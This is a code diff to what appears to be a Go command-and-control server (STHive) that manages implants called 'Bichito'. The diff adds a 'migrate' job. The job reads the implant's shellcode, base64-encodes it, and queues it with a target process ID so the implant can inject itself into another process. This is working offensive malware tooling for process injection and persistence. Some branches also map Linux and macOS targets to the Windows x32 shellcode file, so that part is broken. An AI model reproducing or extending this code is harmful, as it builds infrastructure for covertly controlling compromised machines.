@@ -114,6 +114,16 @@ type InjectRevSshSocks5Bichito struct {
 }
 */
 
+
+
+//Used to send detailed information to Bichito for a Migration to another process.
+//Same mappings: ./src/bichito/modules/biterpreter/migrate_remote_thread_windows/migrate_remote_thread_windows_x64.go
+type BiMigrate struct {
+    Shellcode string   `json:"shellcode"`
+    Pid string   `json:"pid"`
+}
+
+
 //This Struct for all default staging server creation that doesn't require more inputs that just staging name
 //JSON Objects created at: ./src/client/electronGUI/components/bichito/bichito.js
 type InjectDefaultStaging struct {
@@ -2000,6 +2010,102 @@ func jobProcessor(jobO *Job,queue bool){
 			//Staging/POST Actions
 			//	These actions required of a tampering on the Job towards and implant, since they heavily realied in existing Infrastructure to work 
 			//	(Infra. managed by STime)
+
+            case "migrate":
+
+                existB,_ := existBiDB(chid)
+                if !existB{
+                    biChecking(chid,pid,parameters)
+                }
+
+                //Check SysInfo, if empty, craft a new Job to retrieve it
+                bichito := getBichitoDB(chid)
+                if (bichito.Info == "") {
+                
+                    jobsysinfo := &Job{"","",pid,chid,"sysinfo","","Sending","",""}
+
+                    jobsToProcess.mux.Lock()
+                    jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobsysinfo)
+                    jobsToProcess.mux.Unlock()
+                    return
+                }
+
+                //Parse sysinfo and get target OS and architecture
+                var biInfo *SysInfo
+                errDaws := json.Unmarshal([]byte(bichito.Info),&biInfo)
+                if errDaws != nil {
+                    time := time.Now().Format("02/01/2006 15:04:05 MST")
+                    elog := fmt.Sprintf("Job by "+chid+":Bichito Log(Log JSON Decoding Error)"+errDaws.Error())
+                    addLogDB("Hive",time,elog)
+                    return
+                }
+
+                //Need to fix this one to just detect "COmpiled for String --> Compiled for x64: Intel x86-64h Haswell"
+                compiledFor := strings.Split(biInfo.Arch,":")[0]
+                x64 := strings.Contains(compiledFor,"64")
+                x32 := strings.Contains(compiledFor,"86")
+
+                windows := strings.Contains(biInfo.Os,"windows")
+                linux := strings.Contains(biInfo.Os,"linux")
+                darwin := strings.Contains(biInfo.Os,"darwin")
+
+                var shellcodePath string
+
+                switch{
+                    case (x32 && windows):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32_shellcode.binary"
+                    case (x64 && windows):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx64_shellcode.binary"
+                    case (x32 && linux):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32_shellcode.binary"
+                    case (x64 && linux):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32_shellcode.binary"
+                    case (x32 && darwin):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32_shellcode.binary"
+                    case (x64 && darwin):
+                        shellcodePath = "/usr/local/STHive/implants/"+bichito.ImplantName+"/bichitoWindowsx32_shellcode.binary"
+                    default:
+                        time := time.Now().Format("02/01/2006 15:04:05 MST")
+                        elog := fmt.Sprintf("Error in migration for: "+chid+" no shellcodePath found.")
+                        addLogDB("Hive",time,elog)
+                        return  
+                }
+
+                content, err := ioutil.ReadFile(shellcodePath)
+                if err != nil {
+                    //ErrorLog
+                    jStatus = setJobStatusDB(jid,"Error")
+                    jResult = setJobResultDB(jid,"Implant-Migrate(Error reading implant's shellcode): "+err.Error())
+                    if (jStatus != nil){
+                        time := time.Now().Format("02/01/2006 15:04:05 MST")
+                        go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jStatus.Error())
+                        return
+                    }
+                    if (jResult != nil){
+                        time := time.Now().Format("02/01/2006 15:04:05 MST")
+                        go addLogDB("Hive",time,"Job: "+jid+" from user: "+cid+" couldn't update its status/result because DB error: "+jResult.Error())
+                        return
+                    }
+                    return
+                }
+
+                contentb64 := base64.StdEncoding.EncodeToString(content)
+
+
+                //JSON Encode function params 
+                revssshellhparams := BiMigrate{contentb64,parameters}
+                bufBP := new(bytes.Buffer)
+                json.NewEncoder(bufBP).Encode(revssshellhparams)
+                resultBP := bufBP.String()
+
+                jobO.Parameters = resultBP
+                
+
+                //Lock shared Slice
+                jobsToProcess.mux.Lock()
+                jobsToProcess.Jobs = append(jobsToProcess.Jobs,jobO)
+                jobsToProcess.mux.Unlock()
+                return
 
 
 			/* Generate an Empire launcher using Job data
